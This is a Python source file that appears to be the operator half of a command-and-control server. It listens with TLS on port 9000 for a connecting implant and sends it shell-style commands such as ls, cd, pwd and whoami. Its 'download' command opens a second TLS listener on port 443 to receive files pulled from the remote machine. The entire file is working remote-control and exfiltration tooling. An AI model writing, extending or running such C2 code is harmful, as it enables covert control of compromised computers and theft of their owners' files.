import ssl
import socket
import os
import platform
import threading


context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")


bindsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)



def connection():
    connection = False
    while connection == False:
        try:

            print(f"Binding Port: 9000")

            # Attenticating Connection
            connection = True
            # Listening the Connection

            bindsocket.bind(('', 9000))
            bindsocket.listen(5)

            client_socket, address = bindsocket.accept()
            print(f"[*] {address[0]} Connected in {address[1]} Port")
            global conn
            conn = context.wrap_socket(client_socket, server_side=True)
            dir = conn.recv(4096).decode()

            
            while True:
                
                commands = input(f"\033[32m[+] {dir} >\033[m ")

    
                if commands == "pwd":
                    conn.sendall(commands.encode('utf-8'))
                    response = conn.recv(4096)
                    print(response.decode('utf-8'))
                
                elif commands == "help":
                    print("|==========Help==========|\n"
                          "cd (Dir) - Change Directory\n"
                          "whoami - Show current user\n"
                          "ls -la / ls - list all files in current directory\n"
                          "exit - Shutdown C2 Server")


                elif commands == "cd ..":
                    conn.sendall(commands.encode('utf-8'))
                    response = conn.recv(4096)
                    print(response.decode('utf-8'))
                
                elif commands.startswith('cd '):
                    conn.sendall(commands.encode('utf-8'))
                    response = conn.recv(4096)
                    print(response.decode('utf-8'))

                
                elif commands == "ls -la" or commands == "ls":
                    conn.sendall(commands.encode('utf-8'))
                    response = conn.recv(4096)

                    print(response.decode('utf-8'))


                elif commands == "print":
                    conn.sendall(commands.encode('utf-8'))
                    response = conn.recv(4096)

                    print(response.decode('utf-8'))
                

                elif commands.startswith("download "):
                    def handle_file_transfer():
                        transfer_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                        transfer_context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")

                        transfer_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        transfer_socket.bind(('0.0.0.0', 443))
                        transfer_socket.listen(1)
                        print("Servidor de transferência aguardando conexões...")

                        while True:
                            client_socket, addr = transfer_socket.accept()
                            with transfer_context.wrap_socket(client_socket, server_side=True) as conn:
                                try:
                                    file_name = conn.recv(1024).decode('utf-8')
                                    with open(file_name, 'wb') as f:
                                        while True:
                                            data = conn.recv(4096)
                                            if not data:
                                                break
                                            f.write(data)
                                    print(f"[*] File {file_name} received successfully from {addr}!")
                                except Exception as e:
                                    print(f"[!] Transference error: {e}")
                                finally:
                                    conn.close()




                    conn.sendall(commands.encode('utf-8'))
                    print("Pronto para receber o arquivo na porta 443")
                    threading.Thread(target=handle_file_transfer, daemon=True).start()

            
                elif commands == "exit":
                    disconnect = "SERVER_SHUTDOWN"
                    conn.sendall(disconnect.encode('utf-8'))
                    response = conn.recv(4096)
                    print(response.decode('utf-8'))                
                    bindsocket.close()
                    break

                elif commands == "clear":
                    os.system("clear")

        except KeyboardInterrupt or commands == "exit":
            print("\nShutting Down server. Client will try to connect again ...")
        if conn:
            conn.sendall(b"SERVER_SHUTDOWN")  
            conn.close()
        bindsocket.close()


connection()
#shell()

